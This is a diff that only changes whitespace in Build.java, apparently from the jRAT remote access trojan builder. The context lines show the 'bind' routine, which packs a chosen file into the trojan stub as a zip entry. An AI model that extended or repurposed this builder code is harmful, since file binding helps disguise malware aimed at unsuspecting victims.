@@ -33,7 +33,6 @@ import pro.jrat.io.Files;
 import pro.jrat.listeners.BuildListener;
 import pro.jrat.ui.frames.FrameSummary;
 
-
 public class Build {
 
 	public static void copy(InputStream input, OutputStream output) throws Exception {
@@ -258,14 +257,14 @@ public class Build {
 				if (bind) {
 					File bindFile = new File(bindpath);
 					String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());
-					
-					entry = new ZipEntry(bindname + extension);		
+
+					entry = new ZipEntry(bindname + extension);
 					outputStub.putNextEntry(entry);
-					
+
 					FileInputStream fis = new FileInputStream(bindpath);
 					copy(fis, outputStub);
 					outputStub.closeEntry();
-					
+
 					fis.close();
 
 					listener.reportProgress(90, "Writing file to bind", BuildStatus.INFO);
